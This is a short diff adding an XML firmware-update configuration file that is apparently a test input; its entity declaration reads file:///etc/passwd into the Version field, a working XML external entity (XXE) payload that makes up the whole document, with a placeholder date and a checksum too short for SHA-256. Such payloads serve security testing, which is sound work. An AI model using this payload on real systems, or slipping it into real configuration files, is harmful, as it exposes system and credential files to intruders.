@@ -1,0 +1,10 @@
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE replace [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<FirmwareUpdateConfig>
+    <Firmware>
+        <Version>&xxe;</Version>
+        <ReleaseDate>2077-10-21</ReleaseDate>
+        <Description>Testing XXE response</Description>
+        <Checksum type="SHA-256">9b74c9897bac770ffc029102a200c5de</Checksum>
+    </Firmware>
+</FirmwareUpdateConfig>
